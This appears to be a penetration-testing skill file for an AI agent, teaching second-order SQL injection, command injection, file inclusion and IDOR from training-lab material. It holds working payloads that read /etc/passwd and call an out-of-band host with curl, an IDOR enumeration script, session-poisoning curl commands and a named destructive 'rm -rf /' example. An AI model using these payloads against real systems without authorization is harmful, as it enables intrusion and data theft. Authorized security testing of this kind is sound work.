---
name: second-order
description: Second-order vulnerability mindset and testing methodology — second-order SQLi, CMDi, LFI, and IDOR. Use when an initial injection point appears safe but stored user input is later processed by a different endpoint, background job, or administrative function. Covers identification questions, two-step injection methodology, and exploitation patterns for all four second-order classes.
---

# Second-Order Attacks — Mindset, Identification, and Exploitation

This is a mindset and technique skill grounded in the CWEE Modern Web Exploitation Techniques module. It covers how to find and exploit vulnerabilities where the injection point and the trigger are different parts of the application.

---

## 1. Triggers — when this skill applies

- Any multi-step flow: register → login, create profile → view profile, upload file → process file, set preference → use preference
- User data that is **stored** (not just reflected) — username, display name, email, file name, bio, address, any profile field
- Background jobs, logging mechanisms, report generators, export functions, admin review queues
- An obvious injection point (e.g., ping field) is filtered, but related profile fields (username, full name) are not
- "Forgot password" flows, "recently viewed" features, audit log display panels
- Any place where the app reads user-controlled data and uses it in a system call, SQL query, file path, or template

**The core question:** "Where does this stored input go later?"

---

---

## 3. Identification questions — ask these for every target

Before injecting anything, map the app's data flows by asking:

1. **Where is this input stored?** (DB column, file system, session variable, log file, audit trail)
2. **Who reads it back, and when?** (admin panel, cron job, PDF generator, email system, background worker, profile display)
3. **What does the app do with it when it reads it back?** (render in HTML, concatenate into a shell command, use as a file path, embed in a SQL query)
4. **Is there a two-step or multi-step flow?** (Step 1: store. Step 2: trigger/render.)
5. **Are there background jobs I can't see?** (logout handler, report scheduler, session logger — look for debug messages that betray background processing)
6. **What profile/account fields does the app expose to processes?** (Username used in logging? Filename used in file operations? Email subject used in a mailer command?)

---

## 4. 30-second triage

1. Enumerate all stored input fields: registration form, profile update, file upload (filename), comment/review fields, search history, "saved" preferences.
2. For each field, inject a benign but detectable marker: a shell metacharacter in a "safe" field, a path traversal sequence in a name field, a SQL quote in a username.
3. Trigger every possible step-2 action: log out, log back in, generate a report, view your profile, view "recently accessed" items, download/export your data.
4. Observe any behavioral differences: timing changes, errors in responses, unexpected content appearing.

---

## 5. Second-order SQLi

### 5.1 Pattern

Inject SQL payload into a stored field (e.g., username `admin'--`). The injection is sanitized or escaped on write but used unsafely later (e.g., in a password reset query, profile lookup, or admin search that double-decodes or uses a different escaping context).

### 5.2 Detection

Register or update a field with:
```
admin'--
' OR 1=1--
test' AND SLEEP(3)--
```

Then trigger every flow that reads that field: login, password reset, search, admin view. Watch for: SQL errors, unexpected data returned, timing anomalies.

### 5.3 Notes reference

The CWEE Advanced SQL Injections module covers second-order SQLi in depth. Use the `sqli` skill for payload escalation once the injection point is confirmed.

---

## 6. Second-order Command Injection

### 6.1 Pattern

The application protects an obvious execution point (ping, traceroute field) but uses a profile field (username, full name, device name) in a background system call — often a logging mechanism, report generator, or session audit system.

### 6.2 Detection flow (from the notes)

1. Find an obvious CMDi entry point that is filtered (e.g., `deviceIP` field rejects metacharacters).
2. Identify background processing clues: look at ALL responses carefully, including logout/session-end responses, for debug messages like `Session Logged to: /var/log/<username>`.
3. Test the unprotected profile fields with metacharacters that the filter on the main endpoint blocks:
   ```
   `whoami`
   $(id)
   ; id ;
   && id
   | id
   ```
4. Trigger the background job (log out, generate report, export data).
5. Look for the command output in the response, in error messages, or via OOB (time delay for blind).

### 6.3 Working payloads

For username/name fields that end up in a shell logging command:
```
`whoami`
$(cat /etc/passwd)
$(curl YOUR_EZXSS_DOMAIN/cmdi_second_order)
`sleep 5`
```

The backtick and `$()` syntax often bypasses filters that only look for `;`, `|`, `&&`.

### 6.4 Exploitation (from notes)

From the lab: register with username `` `$(cat /flag.txt)` ``, log in, then intercept any GET request, change the URL to `/logout`, send — the command output appears in the response body (`Session Logged to: <command_output>`).

---

## 7. Second-order LFI

### 7.1 Pattern

The app filters path traversal characters (`../`) in the filename field but does NOT filter them in a different field (username, display name) that is also used to construct the file path. Changing the directory component via the unfiltered field + using the filename to name the target file = LFI.

### 7.2 Detection (from the notes)

App structure clue: the file read path is constructed as `/var/www/<username>/<filename>.txt`

1. Test if the **filename** field is filtered: try `../../../etc/passwd` — if rejected, filename is protected.
2. Test if the **username** field is filtered: try changing username to `../../tmp` — if accepted, it's not filtered.
3. If the username is unfiltered, the path becomes `/var/www/../../tmp/<filename>.txt` — path traversal via the username.

### 7.3 Exploit plan (three-step)

```
Step 1: Rename your file to the target filename (e.g., "passwd")
        → This physically moves your file to /var/www/<your_user>/passwd.txt

Step 2: Change your username to a path traversal string (e.g., "../../etc")
        → Due to the bug, files are NOT physically moved

Step 3: Access your renamed file
        → The app reads /var/www/../../etc/passwd.txt
        → LFI achieved
```

### 7.4 Note on scope

LFI via this technique is typically limited to the file extension the app hardcodes (e.g., `.txt`). Still reportable — demonstrates the pattern. Chain with log poisoning if PHP logs are readable.

---

## 8. Second-order IDOR (Blackbox)

### 8.1 Pattern

Step 1 (access): Directly accessing a resource owned by another user is blocked (403/redirect to error). BUT the server still processes the request partially — e.g., setting a session variable, logging the access, or caching a reference.

Step 2 (trigger): A different endpoint reads that session variable/cache without re-checking authorization, exposing the other user's data.

### 8.2 Detection (blackbox approach)

1. Identify the object reference format: numeric ID? MD5 hash? UUID? Try to reverse: `c81e728d9d4c2f636f067f89cc14862c` = MD5("2").
2. Try accessing another user's resource ID: expect a 403 or redirect to error. **Do NOT follow the redirect.**
3. Immediately hit a secondary endpoint (profile page, "recently accessed", dashboard) that might display or reference what you just tried to access.
4. Look for data leakage: the secondary endpoint shows a preview, snippet, or reference to the other user's resource.

### 8.3 Enumeration script template (Python)

```python
import hashlib, requests

URL = "http://target.com/file.php"
COOKIE = {"PHPSESSID": "your_session_here"}
PROFILE_URL = "http://target.com/profile.php"

for file_id in range(1, 100):
    id_hash = hashlib.md5(str(file_id).encode()).hexdigest()

    # Step 1: attempt access (DO NOT follow redirect)
    r = requests.get(URL, params={"file": id_hash}, cookies=COOKIE,
                     allow_redirects=False)

    # Step 2: check profile/secondary endpoint for leakage
    profile = requests.get(PROFILE_URL, cookies=COOKIE)
    if "Access denied" not in profile.text and str(file_id) in profile.text:
        print(f"[+] Second-order IDOR: ID {file_id} ({id_hash}) leaked via profile")
        print(profile.text[:500])
```

### 8.4 Session variable poisoning variant (whitebox clue)

From the notes: if the app sets a session variable `id` on a GET request before redirecting to error, and a display endpoint reads that session variable without re-checking auth:

```bash
# Step 1: Poison session (stop before redirect)
curl -s -i -X GET \
  -H "Cookie: PHPSESSID=$SESSION" \
  "http://target.com/get_data.php?id=1" > /dev/null

# Step 2: Fetch display endpoint (reads poisoned session variable)
curl -s -X GET \
  -H "Cookie: PHPSESSID=$SESSION" \
  "http://target.com/display_data.php"
```

---

## 9. Testing methodology — exhaust all step-2 triggers

After injecting in step 1, systematically exhaust every step-2 trigger:

| Step-2 trigger | What to check |
|---|---|
| Log out | Response body for command output |
| Log back in | Different behavior, timing, error |
| View profile | Leaked data from other user, reflected payload |
| Generate report / export | Report content, file download |
| View "recently accessed" | Data preview from restricted resource |
| Admin moderation view | Blind XSS callback, stored XSS execution |
| Password reset | Payload in reset email subject/body |
| Navigate to dashboard | Debug output, unexpected references |

---

## 10. False-positive checks

- **Sanitization at write and read:** If the app escapes on write AND escapes on read/use, second-order injection fails. Confirm by checking what is actually stored in the DB vs. what is executed.
- **Username length limits:** If the app truncates usernames at 20 chars, a long CMDi payload may be silently dropped.
- **No accessible step-2 trigger:** If you can inject but cannot reach any step-2 trigger (no logout, no report, no admin view), the vuln may be theoretical. Note it but downgrade priority.
- **IDOR blocked at session level too:** If the secondary endpoint ALSO checks ownership (not just the primary), there is no second-order IDOR.

---

## 11. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| Second-order CMDi → RCE | `cmdi` | Full server compromise |
| Second-order SQLi → data dump | `sqli` | DB exfiltration |
| Second-order LFI → source code read | `lfi` | Whitebox recon, credential exposure |
| Second-order IDOR → PII leakage | `idor` | Horizontal priv escalation, data breach |
| Second-order XSS (stored) → admin ATO | `xss` | Account takeover via admin render |
| Second-order payload in email subject → CMDi via mailer | `cmdi` | Mail server RCE |

---

## 12. Reporting template

```
POTENTIAL FINDING: Second-Order [CMDi | SQLi | LFI | IDOR]
Target: <injection endpoint (step 1)> + <trigger endpoint (step 2)>
Step 1 — Injection point:
  Endpoint: <URL>
  Field: <field name>
  Payload stored: <exact payload>
Step 2 — Trigger:
  Endpoint/action: <URL or action that triggers execution>
  Evidence: <response excerpt, timing, error message, leaked data>

Why second-order:
  <explain why the injection point alone is "safe" but the trigger causes execution>

Impact:
  <e.g. RCE as www-data via username field used in session logging,
   or lateral data access via profile page revealing another user's file content>

Chain potential: <second-order + what other vuln>
Next step: <confirm OOB exfil | develop full RCE PoC | enumerate all affected IDs>
```

---

## 13. Recon tracker vector strings

Only log if the user explicitly authorizes:

- `second-order:cmdi:<field>` — second-order CMDi via named field
- `second-order:sqli:<field>` — second-order SQLi via named field
- `second-order:lfi:<field>` — second-order LFI via named path-construction field
- `second-order:idor:<endpoint>` — second-order IDOR via named step-2 endpoint
- `second-order:no:<field>` — tested, step-1 stored but no accessible step-2 trigger found

---

## 14. What NOT to do

- **Do not assume an input is safe just because the immediate response looks clean.** The whole point of second-order is that the trigger is elsewhere. Always exhaust step-2 triggers.
- **Do not only test the "obvious" injection points.** Profile fields, usernames, file names, and display names are prime candidates precisely because developers focus security on the obvious inputs.
- **Do not skip the "recently accessed" or "recently viewed" pattern.** It is a common second-order IDOR vector in blackbox testing.
- **Do not use destructive payloads** (e.g., `$(rm -rf /)`) to confirm CMDi. Use `sleep 5` for blind or `$(curl your-server)` for OOB.
- **Do not auto-log to the recon tracker** without explicit user instruction.
